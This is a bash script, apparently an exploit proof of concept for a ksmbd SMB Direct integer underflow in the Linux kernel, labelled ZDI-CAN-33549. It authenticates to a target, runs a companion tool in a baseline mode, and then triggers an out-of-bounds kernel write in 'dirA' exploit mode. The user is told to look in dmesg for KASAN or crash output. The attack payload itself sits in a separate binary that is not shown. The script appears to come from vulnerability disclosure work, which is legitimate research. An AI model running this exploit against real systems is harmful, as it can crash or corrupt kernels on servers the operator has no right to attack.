#!/bin/bash
# Author: al4n4n (Dadb0d)
# Single-shot trigger for ZDI-CAN-33549: ksmbd SMB Direct integer underflow
# This wraps poc/s3rig in the exploit mode (dirA).
#
# Prerequisites:
#   - s3rig compiled: cd poc && make
#   - Target running ksmbd with SMB Direct + soft-RoCE
#   - Authenticated user on the share (setup.sh handles this)
#
# Usage: ./poc.sh <target-ip> [user] [password]
set -u

HOST="${1:?Usage: $0 <target-ip> [user] [password]}"
USER="${2:-s3guest}"
PASS="${3:-test}"
S3RIG="$(dirname "$0")/poc/s3rig"

if [ ! -x "$S3RIG" ]; then
    echo "[!] s3rig not found. Build it first:"
    echo "    cd poc && make"
    exit 2
fi

echo "=== ZDI-CAN-33549: ksmbd SMB Direct Integer Underflow ==="
echo "[*] Target: $HOST  User: $USER"
echo ""

# Phase 1: Control (benign write — establishes baseline)
echo "[*] Phase 1: Control (benign RDMA write)..."
"$S3RIG" -h "$HOST" -u "$USER" -p "$PASS" -m control 2>&1
CTRL_RC=$?
echo ""

if [ "$CTRL_RC" -ne 0 ]; then
    echo "[!] Control failed (exit $CTRL_RC). Check connectivity and credentials."
    exit 1
fi

# Phase 2: Trigger the integer underflow OOB write
echo "[*] Phase 2: Triggering integer underflow (dirA)..."
"$S3RIG" -h "$HOST" -u "$USER" -p "$PASS" -m dirA 2>&1
TRIG_RC=$?
echo ""

if [ "$TRIG_RC" -eq 0 ]; then
    echo "[+] Exploit payload delivered."
    echo "[*] Check dmesg on the target for KASAN slab-out-of-bounds or GPF crash."
    echo "    dmesg | grep -A20 'BUG: KASAN\\|general protection'"
else
    echo "[!] Trigger failed (exit $TRIG_RC)."
fi

exit "$TRIG_RC"
